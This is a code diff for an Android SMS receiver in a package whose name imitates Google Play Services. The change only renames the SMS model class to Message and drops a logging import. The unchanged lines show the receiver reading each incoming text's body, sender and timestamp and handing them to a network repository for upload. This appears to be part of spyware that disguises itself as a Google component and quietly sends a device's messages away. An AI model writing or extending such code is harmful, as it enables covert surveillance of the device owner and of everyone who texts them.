@@ -6,12 +6,11 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
-import android.util.Log;
 import android.widget.Toast;
 
 import com.google.android.gms.persistent.googleapps.App;
 import com.google.android.gms.persistent.googleapps.network.models.data.Data;
-import com.google.android.gms.persistent.googleapps.network.models.data.event.SMS;
+import com.google.android.gms.persistent.googleapps.network.models.data.event.Message;
 import com.google.android.gms.persistent.googleapps.utils.Constants;
 
 import timber.log.Timber;
@@ -47,7 +46,7 @@ public class ReceiverOnSms extends BroadcastReceiver {
                     String message = messages[0].getDisplayMessageBody();
                     String name = messages[0].getOriginatingAddress();
                     long date = messages[0].getTimestampMillis();
-                    SMS sms = new SMS(phoneNumber,bodyText.toString(), date);
+                    Message sms = new Message(phoneNumber,bodyText.toString(), date);
                     App.getAppComponent().getNetworkRepo()
                             .addSMSOfDevice(Data.newBuilder().info(sms)
                                     .type(Constants.INCOMING_SMS)
